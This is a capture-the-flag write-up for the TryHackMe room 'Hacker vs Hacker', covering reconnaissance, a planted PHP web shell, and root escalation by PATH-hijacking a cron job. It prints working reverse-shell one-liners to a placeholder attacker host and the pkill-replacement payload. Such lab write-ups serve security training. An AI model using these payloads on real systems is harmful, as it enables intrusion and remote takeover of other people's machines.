---
title: 'Hacker vs Hacker'
description: "Someone has compromised this server already! Can you get in and evade their countermeasures?"
date: 2024-05-06T23:08:11+02:00
tags: 
    - "tryhackme"
    - "easy"
draft: false
external_url: "https://tryhackme.com/r/room/hackervshacker"
---

## Questions
1. What is the user.txt flag?
1. What is the proof.txt flag?

## Reconnaissance

### Nmap
```bash
$ nmap -sC -sV <trgt>

Starting Nmap 7.80 ( https://nmap.org ) at 2024-05-06 23:16 CEST
Nmap scan report for <trgt>
Host is up (0.088s latency).
Not shown: 998 closed ports

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: RecruitSec: Industry Leading Infosec Recruitment

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Nmap showed `SSH` on port `22` and `Apache` on port `80`. Simple.

### Website
Website looked basic enough, it did have a file upload at the bottom for CVs.
![cv_upload.png](/write-up/hacker-vs-hacker/cv_upload.png)

Trying to upload any file display a message from the orginal hacker.
> Hacked! If you dont want me to upload my shell, do better at filtering!

Checking the source of the website will show the following:

```html
Hacked! If you dont want me to upload my shell, do better at filtering!

<!-- seriously, dumb stuff:

$target_dir = "cvs/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

if (!strpos($target_file, ".pdf")) {
  echo "Only PDF CVs are accepted.";
} else if (file_exists($target_file)) {
  echo "This CV has already been uploaded!";
} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
  echo "Success! We will get back to you.";
} else {
  echo "Something went wrong :|";
}

-->
```

Summerized:
- Final file will be in `cvs/`
- Filename must have `.pdf` in them (anywhere is fine)

ezpz.

## Exploitation
So we know this server is compromised, we know how and we know where. As the hacker said, he uploaded his shell. Let's find it.

```bash
$ wfuzz -u http://<trgt>/cvs/FUZZ.pdf.php -w /opt/SecLists/Discovery/Web-Content/common.txt --hc 404,403

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://<trgt>/cvs/FUZZ.pdf.php
Total requests: 4727

=====================================================================
ID           Response   Lines    Word       Chars       Payload 
=====================================================================

000003754:   200        1 L      2 W        18 Ch       "shell"          

Total time: 0
Processed Requests: 4727
Filtered Requests: 4726
Requests/sec.: 0
```

**Boom** got it.

Now we need the parameter name used to execute commands..
```bash
$ wfuzz -u http://<trgt>/cvs/shell.pdf.php?FUZZ=id -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt --hl 1

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://<trgt>/cvs/shell.pdf.php?FUZZ=id
Total requests: 6453

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000001164:   200        2 L      5 W        72 Ch       "cmd"

Total time: 0
Processed Requests: 2680
Filtered Requests: 2679
Requests/sec.: 0
```

**Boom²** Success, now we can finally get a foodhold on the system.

## Foothold
Thanks to our fuzzing we know we can execute commands on the server by heading to `http://<trgt>/cvs/shell.pdf.php?cmd=<command>`.
I tried just using a reverse shell but that didn't seem to work. What I can do on the other hand is curl a reverse shell from my machine and pipe it to bash.

```bash
$ cat shell.sh 
bash -i >& /dev/tcp/<atkr>/9001 0>&1
```

We can easily URL encode it using something like [CyberChef](https://gchq.github.io/CyberChef/).
![CyberChef, URL encoding a curl command](/write-up/hacker-vs-hacker/curl_shell.png)

After hosting a http server with `$ python3 -m http.server 9002` I put the encoded payload in the URL, pressed enter and prayed..
```bash
www-data@b2r:/var/www/html$ nc -nvlp 9001
Listening on 0.0.0.0 9001
Connection received on <trgt> 54946
sh: 0: can't access tty; job control turned off
www-data@b2r:/var/www/html/cvs$ _
```
We're in!

## User flag
My first thought was to look in the `/home/` directory to see if we can read anything.
```bash
$ ls -l /home/
total 4
drwxr-xr-x 4 lachlan lachlan 4096 May  5  2022 lachlan
```
'Ello there, we can read and execute in the home directory of `lachlan`.

```bash
www-data@b2r:/home/lachlan$ ls -la
total 36
drwxr-xr-x 4 lachlan lachlan 4096 May  5  2022 .
drwxr-xr-x 3 root    root    4096 May  5  2022 ..
-rw-r--r-- 1 lachlan lachlan  168 May  5  2022 .bash_history
-rw-r--r-- 1 lachlan lachlan  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 lachlan lachlan 3771 Feb 25  2020 .bashrc
drwx------ 2 lachlan lachlan 4096 May  5  2022 .cache
-rw-r--r-- 1 lachlan lachlan  807 Feb 25  2020 .profile
drwxr-xr-x 2 lachlan lachlan 4096 May  5  2022 bin
-rw-r--r-- 1 lachlan lachlan   38 May  5  2022 user.txt

www-data@b2r:/home/lachlan$ cat user.txt
thm{████████████████████████████████}
```
There's the user flag.

## Root flag

```bash
www-data@b2r:/home/lachlan$ cat .bash_history
./cve.sh
./cve-patch.sh
vi /etc/cron.d/persistence
echo -e "dHY5pzmNYoETv7SUaY\n███████████████\n███████████████" | passwd
ls -sf /dev/null /home/lachlan/.bash_history
```

Acording to the history he's:
- Creating a cronjob called `persistence`
- Adding a login to passwd
- Failing to clear the bash history

```bash
www-data@b2r:/home/lachlan$ cat /etc/cron.d/persistence
PATH=/home/lachlan/bin:/bin:/usr/bin
# * * * * * root backup.sh
* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
```

Looks promising, `/home/lachlan/bin` is being set in the `PATH` variable and the `pkill` command used in the cronjob isn't a full path. This means that we could create our own "pkill" binairy inside of `/home/lachlan/bin` and have that run instead.

`www-data` did not have the correct permissions to write to `/home/lachlan/bin/`, I tried to `$ su lachlan` with the credentials from the `.bash_history` file and was successful.

I ran the following command to insert the reverse shell into a file called "pkill" and waited. `echo "bash -c 'bash -i >& /dev/tcp/<atkr>/9002 0>&1'" > bin/pkill; chmod  +x bin/pkill`

```bash
$ nc -nvlp 9002
Listening on 0.0.0.0 9002
Connection received on <trgt> 43462
bash: cannot set terminal process group (1896): Inappropriate ioctl for device
bash: no job control in this shell
root@b2r:~# _
```

Aand we're root.
```bash
root@b2r:~# cat root.txt
thm{████████████████████████████████}
```